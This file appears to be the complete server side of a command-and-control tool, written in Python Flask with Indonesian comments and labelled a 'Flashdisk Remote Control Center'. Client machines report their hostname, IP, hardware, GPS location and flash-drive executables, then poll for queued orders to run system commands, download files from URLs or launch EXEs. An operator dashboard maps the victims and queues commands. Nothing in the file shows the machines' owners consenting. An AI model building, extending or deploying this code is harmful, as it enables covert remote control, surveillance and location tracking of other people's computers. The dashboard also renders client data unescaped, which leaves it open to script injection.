import os
import json
import psycopg2
from flask import Flask, request, jsonify, render_template_string
from datetime import datetime
from psycopg2.extras import RealDictCursor

app = Flask(__name__)

# --- Database helpers ---
def get_db_connection():
    return psycopg2.connect(os.environ.get('POSTGRES_URL'))

def init_db():
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute('''
        CREATE TABLE IF NOT EXISTS reports (
            id SERIAL PRIMARY KEY,
            client_id TEXT,
            hostname TEXT,
            ip TEXT,
            os_info TEXT,
            cpu TEXT,
            ram TEXT,
            disk TEXT,
            gpu TEXT,
            gps_lat REAL,
            gps_lon REAL,
            executables TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
    ''')
    cur.execute('''
        CREATE TABLE IF NOT EXISTS commands (
            id SERIAL PRIMARY KEY,
            client_id TEXT,
            command_type TEXT,
            payload TEXT,
            status TEXT DEFAULT 'pending',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            executed_at TIMESTAMP
        );
    ''')
    conn.commit()
    cur.close()
    conn.close()

init_db()

# --- Helper untuk mengambil data client terbaru ---
def get_latest_report(client_id):
    conn = get_db_connection()
    cur = conn.cursor(cursor_factory=RealDictCursor)
    cur.execute('SELECT * FROM reports WHERE client_id = %s ORDER BY created_at DESC LIMIT 1', (client_id,))
    row = cur.fetchone()
    cur.close()
    conn.close()
    return row

# --- Template HTML dengan maps dan form kirim perintah ---
HTML_DASHBOARD = """
<!DOCTYPE html>
<html>
<head>
    <title>Flashdisk Command Center</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #f0f2f5; }
        .container { max-width: 1400px; margin: auto; }
        h1 { color: #1a73e8; }
        .card { background: white; border-radius: 8px; padding: 15px; margin-bottom: 20px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 8px; text-align: left; border-bottom: 1px solid #ddd; }
        th { background-color: #1a73e8; color: white; }
        .map { height: 400px; width: 100%; margin-top: 10px; }
        .command-form { display: flex; gap: 10px; margin-top: 10px; flex-wrap: wrap; }
        .command-form select, .command-form textarea, .command-form input { padding: 8px; border-radius: 4px; border: 1px solid #ccc; }
        .command-form button { background: #1a73e8; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; }
        .command-list { margin-top: 20px; }
        .status-pending { color: orange; }
        .status-done { color: green; }
    </style>
</head>
<body>
<div class="container">
    <h1>📡 Flashdisk Remote Control Center</h1>
    
    <!-- Pilih Client -->
    <div class="card">
        <h3>Pilih Client</h3>
        <select id="clientSelect" onchange="loadClientData()">
            <option value="">-- Pilih Client --</option>
            {% for client in clients %}
            <option value="{{ client.client_id }}">{{ client.hostname }} ({{ client.ip }}) - {{ client.created_at }}</option>
            {% endfor %}
        </select>
    </div>
    
    <div id="clientDetail" style="display:none;">
        <!-- Informasi Hardware -->
        <div class="card">
            <h3>🖥️ Informasi Hardware</h3>
            <div id="hardwareInfo"></div>
        </div>
        
        <!-- Peta GPS -->
        <div class="card">
            <h3>📍 Lokasi GPS (jika tersedia)</h3>
            <div id="map" class="map"></div>
        </div>
        
        <!-- Kirim Perintah -->
        <div class="card">
            <h3>📨 Kirim Perintah ke Client</h3>
            <div class="command-form">
                <select id="cmdType">
                    <option value="message">Pesan Teks</option>
                    <option value="download_file">Download File (URL)</option>
                    <option value="run_command">Jalankan Perintah Sistem</option>
                    <option value="exec_exe">Jalankan EXE (nama file di flashdisk)</option>
                </select>
                <textarea id="cmdPayload" placeholder="Isi perintah..." rows="2" cols="40"></textarea>
                <button onclick="sendCommand()">Kirim Perintah</button>
            </div>
            <div id="commandResult"></div>
        </div>
        
        <!-- Daftar Perintah -->
        <div class="card command-list">
            <h3>📋 Riwayat Perintah</h3>
            <table id="commandsTable">
                <thead><tr><th>Tipe</th><th>Payload</th><th>Status</th><th>Dibuat</th></tr></thead>
                <tbody></tbody>
            </table>
        </div>
    </div>
</div>

<script>
let currentClientId = null;
let map = null;

function loadClientData() {
    const select = document.getElementById('clientSelect');
    currentClientId = select.value;
    if (!currentClientId) {
        document.getElementById('clientDetail').style.display = 'none';
        return;
    }
    document.getElementById('clientDetail').style.display = 'block';
    fetch(`/api/client/${currentClientId}`)
        .then(res => res.json())
        .then(data => {
            // Hardware info
            const hw = data.report;
            document.getElementById('hardwareInfo').innerHTML = `
                <table>
                    <tr><th>Hostname</th><td>${hw.hostname}</td></tr>
                    <tr><th>IP Publik</th><td>${hw.ip}</td></tr>
                    <tr><th>OS</th><td>${hw.os_info || '-'}</td></tr>
                    <tr><th>CPU</th><td>${hw.cpu || '-'}</td></tr>
                    <tr><th>RAM</th><td>${hw.ram || '-'}</td></tr>
                    <tr><th>Disk</th><td>${hw.disk || '-'}</td></tr>
                    <tr><th>GPU</th><td>${hw.gpu || '-'}</td></tr>
                    <tr><th>File EXE di flashdisk</th><td>${hw.executables || '-'}</td></tr>
                    <tr><th>Laporan terakhir</th><td>${hw.created_at}</td></tr>
                </table>
            `;
            
            // Map
            const lat = hw.gps_lat;
            const lon = hw.gps_lon;
            if (map) map.remove();
            map = L.map('map').setView([lat || -6.2, lon || 106.8], 13);
            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                attribution: '&copy; OpenStreetMap contributors'
            }).addTo(map);
            if (lat && lon) {
                L.marker([lat, lon]).addTo(map).bindPopup(`${hw.hostname}<br>Lat: ${lat}, Lon: ${lon}`).openPopup();
            } else {
                L.marker([-6.2, 106.8]).addTo(map).bindPopup('Lokasi tidak diketahui').openPopup();
            }
            
            // Load commands
            loadCommands(currentClientId);
        });
}

function loadCommands(clientId) {
    fetch(`/api/commands/${clientId}`)
        .then(res => res.json())
        .then(cmds => {
            const tbody = document.querySelector('#commandsTable tbody');
            tbody.innerHTML = '';
            cmds.forEach(cmd => {
                const row = tbody.insertRow();
                row.insertCell(0).innerText = cmd.command_type;
                row.insertCell(1).innerText = cmd.payload.substring(0, 50);
                row.insertCell(2).innerHTML = `<span class="status-${cmd.status}">${cmd.status}</span>`;
                row.insertCell(3).innerText = cmd.created_at;
            });
        });
}

function sendCommand() {
    const cmdType = document.getElementById('cmdType').value;
    const payload = document.getElementById('cmdPayload').value;
    if (!payload) {
        alert('Isi pesan/perintah');
        return;
    }
    fetch('/api/send_command', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            client_id: currentClientId,
            command_type: cmdType,
            payload: payload
        })
    })
    .then(res => res.json())
    .then(data => {
        document.getElementById('commandResult').innerHTML = '<span style="color:green;">Perintah dikirim!</span>';
        document.getElementById('cmdPayload').value = '';
        loadCommands(currentClientId);
        setTimeout(() => document.getElementById('commandResult').innerHTML = '', 3000);
    })
    .catch(err => {
        document.getElementById('commandResult').innerHTML = '<span style="color:red;">Gagal kirim</span>';
    });
}
</script>
</body>
</html>
"""

@app.route('/')
def home():
    # Daftar semua client (ambil unik dari reports)
    conn = get_db_connection()
    cur = conn.cursor(cursor_factory=RealDictCursor)
    cur.execute('''
        SELECT DISTINCT ON (client_id) client_id, hostname, ip, created_at
        FROM reports ORDER BY client_id, created_at DESC
    ''')
    clients = cur.fetchall()
    cur.close()
    conn.close()
    return render_template_string(HTML_DASHBOARD, clients=clients)

@app.route('/api/client/<client_id>')
def get_client(client_id):
    report = get_latest_report(client_id)
    if not report:
        return jsonify({"error": "not found"}), 404
    # Convert datetime to string
    if report.get('created_at'):
        report['created_at'] = report['created_at'].isoformat()
    return jsonify({"report": report})

@app.route('/api/commands/<client_id>')
def get_commands(client_id):
    conn = get_db_connection()
    cur = conn.cursor(cursor_factory=RealDictCursor)
    cur.execute('SELECT * FROM commands WHERE client_id = %s ORDER BY created_at DESC', (client_id,))
    cmds = cur.fetchall()
    cur.close()
    conn.close()
    for cmd in cmds:
        if cmd.get('created_at'):
            cmd['created_at'] = cmd['created_at'].isoformat()
    return jsonify(cmds)

@app.route('/api/send_command', methods=['POST'])
def send_command():
    data = request.json
    client_id = data.get('client_id')
    cmd_type = data.get('command_type')
    payload = data.get('payload')
    if not all([client_id, cmd_type, payload]):
        return jsonify({"error": "Missing fields"}), 400
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute(
        'INSERT INTO commands (client_id, command_type, payload, status) VALUES (%s, %s, %s, %s)',
        (client_id, cmd_type, payload, 'pending')
    )
    conn.commit()
    cur.close()
    conn.close()
    return jsonify({"status": "ok"})

@app.route('/report', methods=['POST'])
def handle_report():
    """Client mengirim laporan hardware lengkap dan daftar exe"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "No data"}), 400
        
        client_id = data.get('client_id')
        if not client_id:
            # create client_id from hostname + ip
            client_id = f"{data.get('hostname')}_{data.get('ip')}"
        
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute('''
            INSERT INTO reports 
            (client_id, hostname, ip, os_info, cpu, ram, disk, gpu, gps_lat, gps_lon, executables)
            VALUES (%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s)
        ''', (
            client_id,
            data.get('hostname'),
            data.get('ip'),
            data.get('os'),
            data.get('cpu'),
            data.get('ram'),
            data.get('disk'),
            data.get('gpu'),
            data.get('gps_lat'),
            data.get('gps_lon'),
            ", ".join(data.get('executables', []))
        ))
        conn.commit()
        cur.close()
        conn.close()
        
        print(f"[Laporan] {client_id} - {data.get('hostname')}")
        return jsonify({"status": "received", "client_id": client_id}), 200
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/poll_commands', methods=['GET'])
def poll_commands():
    """Client memanggil ini untuk mengambil perintah pending"""
    client_id = request.args.get('client_id')
    if not client_id:
        return jsonify([]), 400
    conn = get_db_connection()
    cur = conn.cursor(cursor_factory=RealDictCursor)
    cur.execute('''
        SELECT id, command_type, payload FROM commands 
        WHERE client_id = %s AND status = 'pending' 
        ORDER BY created_at ASC
    ''', (client_id,))
    commands = cur.fetchall()
    # Update status to 'sent' (atau 'processing') agar tidak diambil lagi
    for cmd in commands:
        cur.execute('UPDATE commands SET status = %s WHERE id = %s', ('processing', cmd['id']))
    conn.commit()
    cur.close()
    conn.close()
    return jsonify(commands)

@app.route('/command_result', methods=['POST'])
def command_result():
    """Client melaporkan hasil eksekusi perintah"""
    data = request.json
    cmd_id = data.get('command_id')
    status = data.get('status')  # 'done' or 'failed'
    result = data.get('result')
    if cmd_id:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute('UPDATE commands SET status = %s, payload = %s WHERE id = %s', (status, result, cmd_id))
        conn.commit()
        cur.close()
        conn.close()
    return jsonify({"ok": True})

if __name__ == '__main__':
    app.run(debug=True)